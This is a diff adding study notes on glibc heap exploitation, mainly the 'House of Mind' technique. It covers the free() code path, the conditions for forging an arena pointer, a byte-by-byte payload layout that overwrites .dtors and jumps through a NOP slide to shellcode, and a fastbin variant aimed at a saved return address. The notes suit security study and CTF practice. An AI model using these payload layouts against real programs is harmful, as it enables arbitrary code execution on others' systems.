@@ -35,7 +35,7 @@ To make second chunk  free:
       #define inuse_bit_at_offset(p, s)   (((mchunkptr) (((char *) (p)) + (s)))->size & PREV_INUSE)
 ```
 
-hence if size is 0 then it points itself hence it's inuse_bit is 0 hence free() belives ti as free !!!!!!!!!!!
+hence if size is 0 then it points itself hence it's inuse_bit is 0 hence free() belives it as free !!!!!!!!!!!
 
 
 
@@ -196,7 +196,143 @@ for(;;) {
                      iii) jmp instruction in &(av->bins[0]) {unsorted_chunks(av)->bk = bck  }
                      iv)  bck->fd = EIP = &(av->bins[0]) // place a shellcode here 
          
-          
+### House of mind
+
+####  1) Ingredients:
+
+    One free() of a chunk under the control of the exploiter
+    A sufficiently large memory space where the exploiter can write
+
+#### 2) Code flow 
+
+```C
+
+void
+public_fREe(Void_t* mem)
+{
+  mstate ar_ptr;
+  mchunkptr p;                          /* chunk corresponding to mem */
+  
+  p = mem2chunk(mem);
+
+  ar_ptr = arena_for_chunk(p);
+
+  _int_free(ar_ptr, mem);
+  (void)mutex_unlock(&ar_ptr->mutex);
+}
+
+#define HEAP_MAX_SIZE (1024*1024) /* must be a power of two */
+
+#define heap_for_ptr(ptr) \
+ ((heap_info *)((unsigned long)(ptr) & ~(HEAP_MAX_SIZE-1)))
+
+/* check for chunk from non-main arena */
+#define chunk_non_main_arena(p) ((p)->size & NON_MAIN_ARENA)
+
+#define arena_for_chunk(ptr) \
+ (chunk_non_main_arena(ptr) ? heap_for_ptr(ptr)->ar_ptr : &main_arena)
+
+```
+
+#### 3) Road map  
+
+The arena_for_chunk macro just checks if the NON_MAIN_ARENA flag is set if the flag is not set, then the main_arena pointer is returned, otherwise  the heap_for_ptr just performs a “ptr AND 0xFFF00000” and returns the result. 
 
 
+ The trick is to make the program allocate more and more memory until a chunk is allocated over 0x08100000 in order to have the heap_info structure “located” at 0x08100000.
+ 
+ Now we control ar_ptr i.e first var in heap_info struct 
+ 
+ If the following conditions on the chunk are met, then the unsorted_chunks code is executed:
+ 
+ 
+   * The size of the chunk must not be less than av->max_fast
+   * The IS_MMAPPED bit of the size cannot be set
+   * The overflowed chunk cannot equal av->top
+   * The NONCONTIGUOUS_BIT of av->max_fast must be set
+   * The PREV_INUSE bit of the nextchunk (chunk + size) must be set
+   * The size of nextchunk must be greater than 8
+   * The size of nextchunk must be less than av->system_mem
+   * The PREV_INUSE bit of the chunk must not be set
+   * The nextchunk cannot equal av->top
+   * The PREV_INUSE bit of the chunk after nextchunk (nextchunk + nextsize) must be set
+
+If all these conditions are met, then the following piece of code is executed:
+```
+bck = unsorted_chunks(av);  // bck = &(av-bins[0])
+fwd = bck->fd;   [derefrenced once ]
+p->bk = bck;         <<<<==== same as unlink !!!
+p->fd = fwd;
+bck->fd = p;  
+fwd->bk = p;    [written once]
+```
+
+when free(0x8100000) happens the heap_for_ptr() returns ptr itself (since size is modified by overflow) 
+now heap_for_ptr()->ar_ptr makes us control of ar_ptr and let's say we set it 1 chunk addr+8
+and place shellcode in p  , fwd->bk (let's say eip) = p (shellcode addr).
+
+#### 4) payload 
+
+```
+0xAA 0xAA 0xAA 0xAA            will be overwritten with garbage by free()
+0xAA 0xAA 0xAA 0xAA            will be overwritten with garbage by free()
+
+0x00 0x00 0x00 0x00            av->mutex = 0
+
+0x02 0x01 0x00 0x00            -\
+0x02 0x01 0x00 0x00             |
+0x02 0x01 0x00 0x00             | av->max_fast = 0x102 = 258
+0x02 0x01 0x00 0x00             | (written multiple times just to be
+0x02 0x01 0x00 0x00             | sure of hitting it)
+0x02 0x01 0x00 0x00             |
+0x02 0x01 0x00 0x00             |
+0x02 0x01 0x00 0x00            -/
+
+0x...  DTORS_END-12            -\
+0x...  DTORS_END-12             | av->bins[0]
+[...]                           | repeated 246 times 
+0x...  DTORS_END-12            -/
+
+0x09 0x04 0x00 0x00 malloc'ed chunk's size    -\
+0x41 0x41 0x41 0x41 -\                         |
+[...]                | garbage data * 257      |
+0x41 0x41 0x41 0x41 -/                         | repeated 721 times
+[...]                                          | (all the chunks)
+0x09 0x04 0x00 0x00                            |
+0x41 0x41 0x41 0x41                            |
+[...]                                          |
+0x41 0x41 0x41 0x41                           -/
+
+0x09 0x04 0x00 0x00           size
+1ST CHUNK ADDR + 8            -\
+1ST CHUNK ADDR + 8             | this is the memory address returned that
+1ST CHUNK ADDR + 8             | will be returned by heap_for_ptr: it is
+1ST CHUNK ADDR + 8             | necessary to write the correct address for
+[...]                          | ar_ptr here (256 times)
+1ST CHUNK ADDR + 8            -/
+
+0xEB 0x0C 0x90 0x90           jmp + 12
+
+0x0D 0x04 0x00 0x00           size | NON_MAIN_ARENA
+
+0x90 0x90 0x90 0x90           small NOP slide
+0x90 0x90 0x90 0x90
+0x.. 0x.. SHELLCODE
+```
+   
+##### Fastbin method (This works even now !!! )
+
+if size of ptr2 = 16 then make ar_ptr = pointing to stack ; fb = &(av->fastbins[0]) {under our control} 
+*fb = p [derefrenced and written]
+
+```
+STACK:   ^
+         |
+         |      0xRAND_VAL     av->system_mem (av + 1848)
+         |         ...
+         |      pushed EIP     av->fastbins[0]
+         |      pushed EBP     av->max_fast
+         |      0x00000000     av->mutex
+         |
+```
 
